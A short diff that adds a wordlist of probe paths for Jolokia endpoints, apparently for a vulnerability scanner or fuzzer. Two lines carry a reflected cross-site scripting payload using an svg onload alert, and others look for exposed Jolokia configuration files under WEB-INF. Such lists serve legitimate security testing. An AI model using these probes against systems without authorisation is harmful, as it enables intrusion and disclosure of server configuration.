@@ -1,0 +1,7 @@
+/api/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
+/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
+/jolokia-agent.properties
+/jolokia-access.xml
+/WEB-INF/classes/jolokia-agent.properties
+/WEB-INF/classes/jolokia-access.xml
+{{jolokia_paths}}{{mbean_paths}}
